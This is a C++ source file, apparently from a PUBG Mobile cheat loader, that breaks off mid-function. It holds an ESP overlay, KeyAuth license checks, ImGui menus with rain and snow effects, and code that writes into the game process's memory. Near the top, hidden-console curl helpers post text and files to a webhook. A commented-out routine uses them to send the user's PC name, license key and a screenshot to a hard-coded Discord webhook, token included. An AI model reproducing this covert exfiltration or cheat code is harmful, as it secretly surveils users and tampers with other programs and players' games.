#define STB_IMAGE_IMPLEMENTATION
#define GDIPVER 0x0110
//#define D3DCOMPILER_DLL_A "d3dcompiler.dll"
//#define D3DCOMPILER_DLL_W L"d3dcompiler.dll"
#define D3D_COMPILE_STANDARD_FILE_INCLUDE ((ID3DInclude*)(UINT_PTR)1)
#include"stb_image.h"
#pragma warning(disable : 4996)
//#include "api/bestauth.hpp"
#include"SimpleIni.h"
#include "Microsoft-DirectX-SDK\Include\D3DX11tex.h"
#define LOADER_BRAND "Loader base"
#include "Esp.h"
#include <iostream>
#include <fstream>
#include "imguipp.h"
#include "Unicode.h"
#include "utf.h"
#include "Main.h"
#include "Discord.h"
#include "Arabic/FarsiType.h"
#include "Snowflake.hpp"
#include "api/KeyAuth.hpp"
#define TITLE "Snowflake.cpp"
#include "Notification/imgui_notify.h"
#include "tahoma.h"
#include <atlimage.h>
#include <thread>
#include "wwcd/wwcd.h"

#define TITLEW TEXT(TITLE)
#define WINDOW_WIDTH  1680
#define WINDOW_HEIGHT 1050
#define SNOW_LIMIT 300
std::vector<Snowflake::Snowflake> snow;
Discord* g_Discord;
using namespace std;
using namespace KeyAuth;
using namespace wwcd;
char str1[60] = "";

const string cmd1p1 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
const string cmd1p2 = "\\\"}\" ";

const string cmd2p1 = "curl -F \"file1=@";


int system_no_outputt(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)
		return -1;

	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);

	return rv;
}
void SendText(string text, string webhook_url) {
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());

	string cmd = cmd1p1 + text + cmd1p2 + webhook_url;

	system_no_outputt(cmd.c_str());
	system_no_outputt("cls");
}

void SendFile(string path, string webhook_url) {
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());

	string cmd = cmd2p1 + path + "\" " + webhook_url;

	system_no_outputt(cmd.c_str());
	system_no_outputt("cls");


}

//VOID wwcd::LoginReport()
//{
//	bool IsLogin = false;
//	while (true)
//	{
//
//		if (!IsLogin)
//		{
//
//			char acUserName[100];
//			DWORD nUserName = sizeof(acUserName);
//			GetUserNameA(acUserName, &nUserName);
//			string UsernamePC = acUserName;
//			if (Setting::KeyVersion == 0)
//			{
//
//				SendText("```Free Version / User Name : [" + UsernamePC + "] Key [" + str1 + "]```", "https://discord.com/api/webhooks/1245407579459289152/SZ9rZsn77YuPRsC09JFAOx_K_raDgke9l5khIenQAMk_LTCRmQSJhy9GuIUEbSBpU6Wu");
//
//				std::string path = ("C:\\Login.png");
//				Esp::TakeScreenShot(path);
//				SendFile("C:\\Login.png", "https://discord.com/api/webhooks/1245407579459289152/SZ9rZsn77YuPRsC09JFAOx_K_raDgke9l5khIenQAMk_LTCRmQSJhy9GuIUEbSBpU6Wu");
//				Sleep(2000);
//				remove("C:\\Login.png");
//			}
//			else if (Setting::KeyVersion == 1)
//			{
//
//				SendText("```VIP Version/ User Name : [" + UsernamePC + "] Key [" + str1 + "]```", "https://discord.com/api/webhooks/1245407579459289152/SZ9rZsn77YuPRsC09JFAOx_K_raDgke9l5khIenQAMk_LTCRmQSJhy9GuIUEbSBpU6Wu");
//
//				std::string path = ("C:\\Login.png");
//				Esp::TakeScreenShot(path);
//				SendFile("C:\\Login.png", "https://discord.com/api/webhooks/1245407579459289152/SZ9rZsn77YuPRsC09JFAOx_K_raDgke9l5khIenQAMk_LTCRmQSJhy9GuIUEbSBpU6Wu");
//				Sleep(2000);
//				remove("C:\\Login.png");
//			}
//			IsLogin = true;
//			std::this_thread::sleep_for(std::chrono::milliseconds(40));
//		}
//
//
//		std::this_thread::sleep_for(std::chrono::milliseconds(500000));
//	}
//}

bool KeyVersionCheck(const std::string& str1) {
	if (str1.length() < 3)
		return false;
	std::string lastThreeChars = str1.substr(0, 3);
	return lastThreeChars[0] == 'E' && lastThreeChars[1] == 'S' && lastThreeChars[2] == 'P';
}

bool fight = true;
static bool initialized;
// At the top of your file or somewhere globally accessible
struct Raindrop {
	ImVec2 pos;
	float velocity;
};
std::vector<Raindrop> raindrops;

// In your initialization function (this only runs once)
void initializerain() {
	for (int i = 0; i < 200; i++) {
		Raindrop r;
		r.pos = ImVec2(rand() % 1920, rand() % 1080);
		r.velocity = (rand() % 100) / 80.0f + 0.8f; // Made the raindrops fall faster
		raindrops.push_back(r);
	}
}

void drawrain() {
	ImGui::GetBackgroundDrawList()->AddRectFilled(ImVec2(0, 0), ImVec2(1920, 1080), IM_COL32(0, 0, 0, 128));

	for (auto& r : raindrops) {
		ImVec2 rect_min = r.pos;
		ImVec2 rect_max = ImVec2(r.pos.x + 2.0f, r.pos.y + 10.0f);

		int alpha = static_cast<int>(((r.pos.y / 1080.0f) * 128.0f) + 127.0f);
		ImGui::GetForegroundDrawList()->AddRectFilled(rect_min, rect_max, IM_COL32(0, 255, 255, alpha));

		r.pos.y += r.velocity;
		if (r.pos.y > 1080) {
			r.pos.y = 0;
			r.pos.x = rand() % 1920;
			r.velocity = (rand() % 100) / 80.0f + 0.8f; // Made the new raindrops fall faster
		}
	}
}
struct Particle {
	ImVec2 position;
	ImVec2 velocity;
	float hue;
};
std::vector<Particle> particles;

void initializeParticles() {
	for (int i = 0; i < 200; i++) {
		Particle p;
		p.position = ImVec2(rand() % 1920, rand() % 1080);
		p.velocity = ImVec2((rand() % 100 - 50) / 50.0f, (rand() % 100 - 50) / 50.0f);
		p.hue = static_cast<float>(rand()) / static_cast<float>(RAND_MAX);
		particles.push_back(p);
	}
}
void drawParticles() {
	ImGui::GetBackgroundDrawList()->AddRectFilled(ImVec2(0, 0), ImVec2(1920, 1080), IM_COL32(0, 0, 0, 128));

	for (auto& p : particles) {
		ImVec2 rect_min = p.position;
		ImVec2 rect_max = ImVec2(p.position.x + 2.0f, p.position.y + 2.0f);

		p.hue += 0.001f;
		if (p.hue > 1.0f)
			p.hue -= 1.0f;
		ImVec4 color_in_hsv = ImVec4(p.hue, 1.0f, 1.0f, 1.0f);
		ImColor color_in_rgb = ImColor::HSV(color_in_hsv.x, color_in_hsv.y, color_in_hsv.z);

		ImGui::GetForegroundDrawList()->AddRectFilled(rect_min, rect_max, color_in_rgb);

		p.position.x += p.velocity.x;
		p.position.y += p.velocity.y;
		if (p.position.x < 0 || p.position.x > 1920)
			p.velocity.x *= -1;
		if (p.position.y < 0 || p.position.y > 1080)
			p.velocity.y *= -1;
	}
}
std::vector<Particle> snowflakes;

void initializeSnowflakes() {
	snowflakes.clear();
	for (int i = 0; i < 500; i++) { // Adjust the number of snowflakes accordingly
		Particle p;
		p.position = ImVec2(rand() % 1920, rand() % 1080); // Random starting position
		p.velocity = ImVec2((rand() % 50 - 25) / 100.0f, 0.5 + rand() % 50 / 100.0f); // Reduced the maximum velocity from 1 to 0.5
		snowflakes.push_back(p);
	}
}

void drawSnowflakes() {
	ImGui::GetBackgroundDrawList()->AddRectFilled(ImVec2(0, 0), ImVec2(1920, 1080), IM_COL32(0, 0, 0, 128)); // Adding transparent black background

	for (auto& s : snowflakes) {
		ImGui::GetForegroundDrawList()->AddCircleFilled(s.position, 2, IM_COL32(255, 255, 255, 255)); // You can adjust the size and color as needed

		s.position.x += s.velocity.x;
		s.position.y += s.velocity.y;

		if (s.position.y > 1080) { // If snowflake has reached the bottom
			s.position.x = rand() % 1920; // Random position on the x axis
			s.position.y = 0; // Reset to the top
		}
	}
}

inline void MenuItemURL(const char* name_, std::string URL_)
{
	std::string linkIconName = std::string(ICON_FA_LINK "\t" + std::string(name_));
	if (ImGui::MenuItem(linkIconName.c_str()))
	{
		string StartCode = "/C start " + URL_;

		ShellExecuteA(NULL, "open", "cmd.exe", StartCode.c_str(), 0, SW_HIDE);
	}
	if (ImGui::IsItemHovered())
	{
		ImGui::SetTooltip(ICON_FA_LINK "  Open in browser\n%s", URL_.c_str());
	}
}

std::string str = "Pubg Mobile";
bool login = false;
bool server = false;
bool server1 = false;
bool loginn = true;
bool SaveUsers = true;
bool savekey = true;
bool loader_active = true;
D3DMATRIX Esp::ViewMatrix;
static bool Bot = true;
static bool Player = true;
std::string tim;

float overlaycolor = 0.0f;
int teamids;

ImVec4 linescolors;// = { 1.0f,1.0f,1.0f,1.0f };
ImVec4 bonescolors = { 1.0f,1.0f,1.0f,1.0f };
ImVec4 fullboxcolor;// = { 1.0f,1.0f,1.0f,1.0f };
float cornerboxcolor[4] = { 1.0f,1.0f,1.0f,1.0f };
float bcornerboxcolor[4] = { 1.0f,1.0f,1.0f,1.0f };
ImVec4 whitecolr = { 1.0f,1.0f,1.0f,1.0f };
float cornerboxcolo[4] = { 255, 255, 255, 255 };
ImVec4 blinescolors;
ImVec4 bbonescolors;
ImVec4 bfullboxcolor;
bool driving = true;
ImColor col;
bool unload = false;

static auto Flags2 = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar;
static auto Flags21 = ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar;
static auto Flags22 = ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar;
static auto Flags221 = ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar;

namespace Settings
{
	static int MainTab = 1;
	static int EspTab = 1;
	static int AimTab = 1;
	static int MemoryTab = 1;
}


//VOID Esp::InitMenuStrings()
//{
//	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
//	if (Setting::Lang == 1)
//	{
//		visualsar = u8"كشف الاماكن";
//		visualsarString = converter.from_bytes(reinterpret_cast<const char*>(visualsar.c_str()));
//		visualsarStringView = Ws_ExType::ConvertToFAGlyphs(visualsarString.c_str()).c_str();
//	}
//	else if (Setting::Lang == 0 || Setting::Lang == 2)
//	{
//		visualsarStringView = "VISUALS";
//
//	}
//
//
//}

//void tabs()
//{
//	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
//
//	D3DX11_IMAGE_LOAD_INFO info;
//	ID3DX11ThreadPump* pump{ nullptr };
//
//	ImVec2 pos;
//	ImDrawList* draw;
//
//	pos = ImGui::GetWindowPos();
//	draw = ImGui::GetWindowDrawList();
//	ImGuiIO& Io = ImGui::GetIO();
//	ImVec4* colors = ImGui::GetStyle().Colors;
//	colors[ImGuiCol_Button] = ImColor(35, 35, 45, 0);
//	colors[ImGuiCol_ButtonActive] = ImColor(63, 63, 60, 255);
//	colors[ImGuiCol_ButtonHovered] = ImColor(63, 63, 60, 255);
//	ImGui::PushFont(DX11::ImGui_DX11::Font1);
//	ImGui::SetCursorPos(ImVec2(12, 94));//
//	if (ImGui::Button("##BULLETTRACKING", ImVec2(172, 31)))
//		Settings::Tab = 0;
//	ImGui::SetCursorPos(ImVec2(12, 140));//
//	if (ImGui::Button("##PLAYERESP", ImVec2(172, 31)))
//		Settings::Tab = 1;
//	ImGui::SetCursorPos(ImVec2(12, 170));//
//	if (ImGui::Button("##WEAPONSTEXT", ImVec2(172, 31)))
//		Settings::Tab = 2;
//	ImGui::SetCursorPos(ImVec2(12, 210));//
//	if (ImGui::Button("##WEAPONSIMAGE", ImVec2(172, 31)))
//		Settings::Tab = 3;
//
//	ImGui::SetCursorPos(ImVec2(12, 260));//
//	if (ImGui::Button("##MEMORY", ImVec2(172, 31)))
//		Settings::Tab = 4;
//
//	ImGui::SetCursorPos(ImVec2(12, 320));//
//	if (ImGui::Button("##SETTINGS", ImVec2(172, 31)))keyau
//		Settings::Tab = 5;
//	if (Setting::Lang == 0 || Setting::Lang == 2)
//	{
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 101), ImColor(255, 255, 255), "BULLET TRACKING");//
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 147), ImColor(255, 255, 255), "PLAYER ESP");//
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 180), ImColor(255, 255, 255), "WEAPONS TEXT");//
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 217), ImColor(255, 255, 255), "WEAPONS IMAGE");//
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 268), ImColor(255, 255, 255), "MEMORY");//
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 328), ImColor(255, 255, 255), "SETTINGS");//
//
//	}
//	if (Setting::Lang == 1)
//	{
//		std::u8string btk = u8"بولت تراك";
//		std::wstring btks = converter.from_bytes(reinterpret_cast<const char*>(btk.c_str()));
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 101), ImColor(255, 255, 255), Ws_ExType::ConvertToFAGlyphs(btks).c_str());//
//		std::u8string psv = u8"كشف اللاعبين";
//		std::wstring psvs = converter.from_bytes(reinterpret_cast<const char*>(psv.c_str()));
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 147), ImColor(255, 255, 255), Ws_ExType::ConvertToFAGlyphs(psvs).c_str());//
//		std::u8string wtv = u8"كشف الاسلحة بالكتابة";
//		std::wstring wtvs = converter.from_bytes(reinterpret_cast<const char*>(wtv.c_str()));
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 180), ImColor(255, 255, 255), Ws_ExType::ConvertToFAGlyphs(wtvs).c_str());//
//
//		std::u8string wtvi = u8"كشف الاسلحة بالصور";
//		std::wstring wtvis = converter.from_bytes(reinterpret_cast<const char*>(wtvi.c_str()));
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 217), ImColor(255, 255, 255), Ws_ExType::ConvertToFAGlyphs(wtvis).c_str());//
//		std::u8string memi = u8"الميموري";
//		std::wstring memis = converter.from_bytes(reinterpret_cast<const char*>(memi.c_str()));
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 268), ImColor(255, 255, 255), Ws_ExType::ConvertToFAGlyphs(memis).c_str());//
//		std::u8string SETi = u8"الاعدادات";
//		std::wstring SETis = converter.from_bytes(reinterpret_cast<const char*>(SETi.c_str()));
//		draw->AddText(DX11::ImGui_DX11::Font2, 15.f, ImVec2(pos.x + 51, pos.y + 328), ImColor(255, 255, 255), Ws_ExType::ConvertToFAGlyphs(SETis).c_str());//
//
//	}
//
//
//	ImGui::SetCursorPos(ImVec2(25, 102));//
//	ImGui::Image(DX11::r, ImVec2(15, 15));
//
//	ImGui::SetCursorPos(ImVec2(25, 148));//
//	ImGui::Image(DX11::p, ImVec2(15, 15));
//
//
//
//	ImGui::SetCursorPos(ImVec2(25, 181));//
//	ImGui::Image(DX11::w, ImVec2(15, 15));
//
//	ImGui::SetCursorPos(ImVec2(25, 219));//
//	ImGui::Image(DX11::w, ImVec2(15, 13));
//
//	ImGui::SetCursorPos(ImVec2(25, 269));//
//	ImGui::Image(DX11::g, ImVec2(15, 13));
//
//
//	ImGui::SetCursorPos(ImVec2(25, 329));
//	ImGui::Image(DX11::c, ImVec2(15, 15));
//
//	ImGui::PopFont();
//}


bool watermark = true;
int currIndex;
float popcorn = 0.5f;
float popcorn2 = 0.450f;
ImVec4 colorr;
int Emu_Int = 0;
int item_current_Emu = 0;
int currentengine = 0;
int item_current_Aim = 0;
int skelesec = 0;
//  (DX11::pDevice, &logo, sizeof(logo), 462, 462, D3DX_DEFAULT, 0, D3DFMT_UNKNOWN, D3DPOOL_DEFAULT, D3DX_DEFAULT, D3DX_DEFAULT, 0, NULL, NULL, &logggo);
ImVec4 to_vec4(float r, float g, float b, float a)
{
	return ImVec4(r / 255.0, g / 255.0, b / 255.0, a / 255.0);


}
static ImVec4 BorderColor = to_vec4(255, 255, 255, 255);

std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}
std::string GetCurrentDirectory()
{
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	return std::string(buffer).substr(0, pos);
}
inline bool FileExist(const std::string& name) {
	if (FILE* file = fopen(name.c_str(), "r")) {
		fclose(file);
		return true;
	}
	else {
		return false;
	}
}
void Esp::LoadConfig(std::string Path) {
	CSimpleIniA ini;
	ini.SetUnicode();
	SI_Error rc = ini.LoadFile(Path.c_str());
	//	if (rc < 0) { std::cout << "File not found"; };
	if (FileExist(Path))
	{
		bool State = ini.GetBoolValue("Key", "UserKeyState");
		if (State == true)
		{
			std::string Key = ini.GetValue("Key", "UserKey");
			if (Key != "")
			{
				strcpy(str1, Key.c_str());
				SaveUsers = true;
			}

		}

	}
	/* if (ini.GetValue("Key", "UserKey")=="123")
	 {
	 //ثواني و جاي
	 }*/
}


void WriteUE4Float(DWORD offset, float replace)
{
	DWORD ue4Header = Utility::ReadMemoryEx<int>(0xE0C3868);
	DWORD oldprotect;
	VirtualProtectEx(Game::hProcess, (LPVOID)(ue4Header + offset), sizeof(float), PAGE_EXECUTE_READWRITE, &oldprotect);
	WriteProcessMemory(Game::hProcess, (LPVOID)(ue4Header + offset), &replace, sizeof(float), NULL);
	VirtualProtectEx(Game::hProcess, (LPVOID)(ue4Header + offset), sizeof(float), PAGE_READONLY, &oldprotect);
}
std::string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}

void WriteConfig(std::string Path, std::string Key, bool State) {
	CSimpleIniA ini;
	ini.SetUnicode();
	SI_Error rc = ini.LoadFile(Path.c_str());
	if (rc < 0) {
		//	std::cout << "File not found";
	};
	if (State == true)
	{
		ini.SetBoolValue("Key", "UserKeyState", true);
	}
	else
	{
		ini.SetBoolValue("Key", "UserKeyState", false);
	}
	ini.SetValue("Key", "UserKey", Key.c_str());

	ini.SaveFile(Path.c_str());
}

bool dirExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}


void WriteResToDisk(std::string PathFile, LPWSTR File_WITHARG)
{
	HRSRC myResource = ::FindResource(NULL, File_WITHARG, RT_RCDATA);
	unsigned int myResourceSize = ::SizeofResource(NULL, myResource);
	HGLOBAL myResourceData = ::LoadResource(NULL, myResource);
	void* pMyExecutable = ::LockResource(myResourceData);
	std::ofstream f(PathFile, std::ios::out | std::ios::binary);
	f.write((char*)pMyExecutable, myResourceSize);
	f.close();
}
static void HelpMarkerQuestionMark(const char* desc)
{
	ImGui::TextDisabled("(?)");
	if (ImGui::IsItemHovered())
	{
		ImGui::BeginTooltip();
		ImGui::PushTextWrapPos(ImGui::GetFontSize() * 35.0f);
		ImGui::TextUnformatted(desc);
		ImGui::PopTextWrapPos();
		ImGui::EndTooltip();
	}
}

std::string wideToMultiByte(std::wstring const& wideString)
{
	std::string ret;
	std::string buff(MB_CUR_MAX, '\0');

	for (wchar_t const& wc : wideString)
	{
		int mbCharLen = std::wctomb(&buff[0], wc);

		if (mbCharLen < 1) { break; }

		for (int i = 0; i < mbCharLen; ++i)
		{
			ret += buff[i];
		}
	}

	return ret;
}

void StealthXx()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

bool ProcessInlineHexColor(const char* start, const char* end, ImVec4& color)
{
	const int hexCount = (int)(end - start);
	if (hexCount == 6 || hexCount == 8)
	{
		char hex[9];
		strncpy(hex, start, hexCount);
		hex[hexCount] = 0;

		unsigned int hexColor = 0;
		if (sscanf(hex, "%x", &hexColor) > 0)
		{
			color.x = static_cast<float>((hexColor & 0x00FF0000) >> 16) / 255.0f;
			color.y = static_cast<float>((hexColor & 0x0000FF00) >> 8) / 255.0f;
			color.z = static_cast<float>((hexColor & 0x000000FF)) / 255.0f;
			color.w = 1.0f;

			if (hexCount == 8)
			{
				color.w = static_cast<float>((hexColor & 0xFF000000) >> 24) / 255.0f;
			}

			return true;
		}
	}

	return false;
}

const char ColorMarkerStart = '{';
const char ColorMarkerEnd = '}';

void TextWithColors(const char* fmt, ...)
{
	char tempStr[4096];

	va_list argPtr;
	va_start(argPtr, fmt);
	_vsnprintf(tempStr, sizeof(tempStr), fmt, argPtr);
	va_end(argPtr);
	tempStr[sizeof(tempStr) - 1] = '\0';

	bool pushedColorStyle = false;
	const char* textStart = tempStr;
	const char* textCur = tempStr;
	while (textCur < (tempStr + sizeof(tempStr)) && *textCur != '\0')
	{
		if (*textCur == ColorMarkerStart)
		{
			// Print accumulated text
			if (textCur != textStart)
			{
				ImGui::TextUnformatted(textStart, textCur);
				ImGui::SameLine(0.0f, 0.0f);
			}

			// Process color code
			const char* colorStart = textCur + 1;
			do
			{
				++textCur;
			} while (*textCur != '\0' && *textCur != ColorMarkerEnd);

			// Change color
			if (pushedColorStyle)
			{
				ImGui::PopStyleColor();
				pushedColorStyle = false;
			}

			ImVec4 textColor;
			if (ProcessInlineHexColor(colorStart, textCur, textColor))
			{
				ImGui::PushStyleColor(ImGuiCol_Text, textColor);
				pushedColorStyle = true;
			}

			textStart = textCur + 1;
		}
		else if (*textCur == '\n')
		{
			// Print accumulated text an go to next line
			ImGui::TextUnformatted(textStart, textCur);
			textStart = textCur + 1;
		}

		++textCur;
	}

	if (textCur != textStart)
	{
		ImGui::TextUnformatted(textStart, textCur);
	}
	else
	{
		ImGui::NewLine();
	}

	if (pushedColorStyle)
	{
		ImGui::PopStyleColor();
	}
}


void NationFlag(VECTOR3 Screen, AActor& AActor, int PosX, int PosY, int X, int Y)
{

	if (AActor.Nation == "JM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::JMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "G1")
	{
		DX11::ImGui_DX11::DrawImage(DX11::G1FLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ALFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "DZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::DZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ASFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ADFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AQ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AQFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ARFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ATFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BB")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BBFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BJ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BJFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BQ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BQFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BV")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BVFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::IOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CV")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CVFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CA")
	{
